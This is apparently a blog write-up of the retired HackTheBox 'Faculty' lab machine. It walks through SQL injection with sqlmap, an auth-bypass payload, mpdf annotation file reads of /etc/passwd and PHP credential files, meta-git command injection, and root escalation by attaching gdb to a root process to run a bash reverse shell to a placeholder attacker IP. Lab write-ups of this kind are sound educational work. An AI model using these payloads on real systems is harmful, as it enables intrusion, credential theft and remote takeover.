---
title: "Faculty(HTB)"
permalink: /writeups/faculty
---

# <a href="https://app.hackthebox.com/machines/Faculty" target="_blank">Faculty (HTB)</a>

![Faculty HTB Logo](/writeups/Faculty/logo.png "Logo")

## Tags
ctf, htb, hack the box, medium, faculty

## Metadata

| Written | 08/11/2022
| Author | Thetvdh
| Platform | HackTheBox
| Box Type | Linux

## Tools used

- nmap
- sqlmap
- name-that-hash
- hashcat
- Crackstation
- JtR
- BurpSuite
- grep
- awk
- ssh

# Introduction

Hello again, this is my writeup for the "Faculty" machine on HackTheBox. I did the box a while ago but waited until the box was retired to write it up. As this machine was done a long time ago this writeup will be more of an analysis of how I was thinking and some of the steps I tried (and failed) in order to complete this box, rather than a step by step guide. This is possibly the hardest CTF box I have completed to date but It was thoroughly enjoyable, even if it did take me nearly 3 weeks to finish it!

In this box the target IP is 10.10.11.169 althought mainly the target will be faculty.htb as HTB loves a host file edit!

# Enumeration

First things first an nmap scan:

```
# Nmap 7.92 scan initiated Sat Jul 16 17:21:01 2022 as: nmap -sVC -T4 -p- -o nmap.txt 10.10.11.169
Nmap scan report for 10.10.11.169
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 16 17:21:50 2022 -- 1 IP address (1 host up) scanned in 48.49 seconds
```

This nmap scan indicates a redirect to http://faculty.htb using a NGINX virtual host. This means we need to add the following entry to our host file:

```
/etc/hosts entry
10.10.11.169	faculty.htb
```

Accessing faculty.htb redirects to http://faculty.htb/login.php

We are given a login page where it asks for an ID to access what appears to be some form of timetabling system.

As a quick check I intercepted the form POST request and ran Burp Intruder on it with numbers 1-150 to check to see if it was that simple. Unsuprisingly it wasn't.

Next was checking to see if ID was vulnerable to SQLi.

For this I used SQLmap.

```
sqlmap -r loginintercept.txt --risk=3 --level=5 --tables
```

In CTF challenges I usually specifiy high levels of risk and intensity (levels) as I don't have to worry about setting of and IDS or equivalent. In a real scenario / pentest I would recommend manually testing rather than using SQLmap.

sqlmap works out that the "id" parameter is injectable. From this we get some useful information:

```
DBMS = MySQL

Databases: Information_schema, Scheduling_db

[17:40:04] [INFO] fetching number of tables for database 'scheduling_db'
[17:40:04] [INFO] retrieved: 6
[17:40:04] [INFO] retrieved: class_schedule_info
[17:40:09] [INFO] retrieved: courses
[17:40:10] [INFO] retrieved: faculty
[17:40:12] [INFO] retrieved: schedules
[17:40:14] [INFO] retrieved: subjects
[17:40:16] [INFO] retrieved: users
```

The information_schema isn't particularly useful to us as we're using an automated tool. It would be useful if we were performing manual injections.

Focusing on the scheduling_db, I extracted the columns from the users table:

```
sqlmap -r loginintercept.txt --risk=3 --level=5 --columns -D scheduling_db -T users

+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| name     | text         |
| password | text         |
| type     | tinyint(1)   |
| username | varchar(200) |
+----------+--------------+
```

Now from this I attempted to extract the usernames and passwords from this table however SQLMap wasn't enjoying my commands for some reason

```
sqlmap -r loginintercept.txt --risk=3 --level=5 --passwords -D scheduling_db -T users
Failed
sqlmap -r loginintercept.txt --passwords -D scheduling_db -T users
Failed
sqlmap -r loginintercept.txt --passwords -D scheduling_db -T users --no-cast
Failed
sqlmap -r loginintercept.txt --passwords -D scheduling_db -T users --hex
Failed
```

If anyone can tell me why these commands weren't working please let me know.

Eventually I decided to dump the whole database which worked

```
Table: users
[1 entry]
+----+---------------+------+----------------------------------+----------+
| id | name          | type | password                         | username |
+----+---------------+------+----------------------------------+----------+
| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
+----+---------------+------+----------------------------------+----------+

```

This looks like we have an administrator password

# Hashcracking

Obviously I attempted to crack this hash

echo '1fecbe762af147c1176a0fc2c722a345' > hash.txt

nth --file hash.txt

NTH says the hash is an MD5.

hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

Hash didn't work

tried a few different wordlists, JtR, and Crackstation. Nothing worked.

I decided this was a dead end and moved on.

# Back to the web!

We know that the login page is vulnerable to SQLi so potentially it is also vulnerable to authentication bypass. Unfortunately we do not know any IDs so cannot test this theory. We can continue with some enumeration though so I ran ffuf against it.

Running ffuf reveals /admin as an endpoint (apologies for the JSON format of this output, I forgot to copy the command line output. I have put the whole thing in a separate file which can be accessed [here](/writeups/Faculty/ffuf.json))

```json
{
            "input": {
                "FUZZ": "admin"
            },
            "position": 259,
            "status": 301,
            "length": 178,
            "words": 6,
            "lines": 8,
            "content-type": "text/html",
            "redirectlocation": "http://faculty.htb/admin/",
            "duration": 25751093,
            "resultfile": "",
            "url": "http://faculty.htb/admin",
            "host": "faculty.htb"
        }
```

Accessing the admin page gives us another login asking for a username and password. Generally if a web dev makes a mistake in one place it is highly likely they will make it in another. As such, I tried a simple authentication bypass payload on the login box on /admin.
```
admin';#
```

It worked! We now have access to the administrator account.

Exploring the Web App a little gives us some interesting findings:

1) The functionality to add new items to the timetable was vulnerable to HTML tag injection.
2) When a report is generated it gets sent to a endpoint /download.php using something called [mpdf](https://mpdf.github.io/).

MPDF is a tool used to generate PDF files from HTML. Generating a report from the web app tells us that the part we can control (the items on the timetable) get reflected into the PDF. I tested this by using a \<h1> tag and in the PDF it was formatted correctly. 

This is the part of the challenge that took me the longest. This vulnerability gives us XSS and also potentially LFI which is a really important part in the challenge. However, using script tags caused issues as the input would be filtered. After a while (about 5 days) of trying different [bypasses](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec) I decided to analyse the web request. This is something I should've done much earlier as in the web request was a long string of base64. Decoding this webrequest using [CyberChef](https://gchq.github.io/CyberChef) gave me the HTML of the page that was getting passed to mpdf. Wonderful! Now we know this we can inject our own html into this request by converting it to Base64.

Using [this](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks
) lovely cheatsheet by PayloadsAllTheThings I tried some test files out to see if my theory was correct. The payload I used looked something like this:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

What this payload does is it will attach that file as an annotation to the PDF. I tested this out on files such as:

- /etc/issue
- /etc/passwd
- /etc/hosts

These all worked. I then decided to try and access some juicier files such as /etc/shadow. Unfortunately the account running the webserver did not have permissions to /etc/shadow.

We know this is a PHP web app (mpdf is a PHP addon and download.php). We also know it is attached to a database. PHP connection credentials to databases are stored in the PHP files so if we are able to download these files then we get access to credentials that could have potentially been reused on the SSH port.

Using the same payload, I attempted to download /var/www/html/index.php but was unsuccessful

While we probably could keep guessing it would be easier to find the path using some other method.

I decided to analyse every web request to pages that we can access, starting with index.php as a logged in user.

Doing this we see a request to this endpoint /admin/ajax.php?action=get_schecdule

Now this is the request that gets the schedule for the currently logged in user. What would happen if we gave it some information that wasn't related to a currently logged in user?

Changing the faculty id to the string "random" (anything would do here, I just tried random) threw an error and gave us a lovely stack trace which gave us a path to some very sensitive information.

/var/www/scheduling/admin/admin_class.php

admin_class.php sounds very much like something that will contain db credentials, lets have a look

Again, using the same payload we can download the admin_class.php file. I have extracted this part as it is the most important

```php
session_start();
ini_set('display_errors', 1);
Class Action {
	private $db;

	public function __construct() {
		ob_start();
   	include 'db_connect.php';
    
    $this->db = $conn;
	}
	function __destruct() {
	    $this->db->close();
	    ob_end_flush();
	}

```

In the constructor it is including db_connect.php. This is likely where the credentials are stored. Let us access this file

```php
<?php 

$conn= new mysqli('localhost','sched','<REDACTED>','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

Lovely, we have some credentials. Now let us test the theory of password reuse.

We downloaded the /etc/passwd file while testing which gives us a list of users on the system. We're only interested in the users with logons as they're the only ones that could have SSH.

To extract the users with logons from this file we can run the following command:

```sh
cat /etc/passwd | grep -i "/bin/bash" | awk -F ":" '{print $1}'
```

This gives us three users:

- root
- gbyolo
- developer

It is highly unlikey SSH will be enabled on root but there is no harm checking.

```
ssh {username}@faculty.htb
```

After testing all three usernames gbyolo has the same password as the db credentials. Poor security that.

Now we are SSHed into the system we can look at escalating our privileges.

# Privesc

## Stage 1: Getting access to developer

As there is 3 accounts, it is highly likely we will need to move to the developer account before we can access root. However, it is important to still check for other methods of priviledge escalation.

### sudo -l

can run /usr/local/bin/meta-git as developer

This looks like it could be it however it is still important to check other parts.

### SUID binaries

```s
find / -perm -u=s -type f 2>/dev/null
```
Nothing interesting here.

### Crontab

The crontab is also empty, nothing interesting

### Exploiting meta-git

meta-git is a npm package that allows for management of meta git repositories. I personally am not 100% sure what a meta git repository is but it is our way in!

If you would like some more information on the package you can view it [here](https://www.npmjs.com/package/meta-git)

Doing some googling led me to this hackerone [article](https://hackerone.com/reports/728040) that allows for RCE. Now, as I love me some Vim, I decided to use vim as a method of RCE as in my testing I found it was the most consistent to get a shell.

```s
Payload:
sudo -u developer /usr/local/bin/meta-git clone 'test||vim'
```

This command spawns us a vim session where we can use the command functionality to give us a bash instance:
`:!/bin/bash`

Running whoami and id confirms that we are now developer.

### Stage 2: Developer to Root

I ran the same checks as before and nothing interesting was there. I then decided to check capabilities as they are a sneaky way box creators like to get under the radar.

`getcap -r / 2>/dev/null`

Do not, I repeat DO NOT, forget to redirect errors to /dev/null. Your terminal will look awful and become basically unreadable.

```s
Capabilities
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

Now most of these look fairly normal but gdb having a capability is not something that you see as standard. GDB is the GNU Debugger used primarily for debugging C programs, very useful when combined with gef in reverse engineering but I digress.

### Exploiting gdb

The first thing I do when I get given a capability (or anything similar SUID, sudo, SGID etc) is check GTFObins

[https://gtfobins.github.io/gtfobins/gdb/#capabilities](https://gtfobins.github.io/gtfobins/gdb/#capabilities)

Now unfortunately just running the GTFObins command doesn't work. However it did make me think about some interesting things. On GTFObins the capability is setuid whereas on this box it is cap_sys_ptrace+ep. Googling this shows that we can inject shell code into a running program [Source](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/). Now we just need to pick a program to inject into. 

Running ps aux lists out every current running program and who is running it. We want one that is runing as root. Looking through this list I spot networkd-dispatcher which is a python process. Googling this led me to a Microsoft article on a vulnerability dubbed Nimbuspwn. While this isn't the direct answer it does give some inspiration on how to do this. After some trial and error I came up with this:

```sh
export PID=$(ps aux | grep -i "^root.*python3" | awk '{print $2}')
gdb -p $PID # attaches to the python process running the networkd-dispatcher
call (void)system("bash -c 'bash -i >& /dev/tcp/{attacker_ip}/9999 0>&1'") # creates a reverse shell
```

Essentially we're finding the PID which the python process running as root and attaching gdb to it. We're then calling a bash reverse shell command inside this process.

On our attacker machine we need to setup a listener

`nc -lvnp 9999`

Then we run our mini exploit and we get a connection!

Running id shows we are root and we can now get the flags.

# Conclusion

To conclude this was a very well put together box with an interesting privesc vector and a really tricky initial foothold. This box taught me a lot about web vulnerabilities and also how developers are sometimes really lazy with their sanitisation. This is probably the most research intensive box I have ever done and a lot of the research I did for this box I didn't include in this writeup as it wasn't relevant. Overall though a thoroughly enjoyable box and would highly recommend while it is still in the free tier of retired boxes!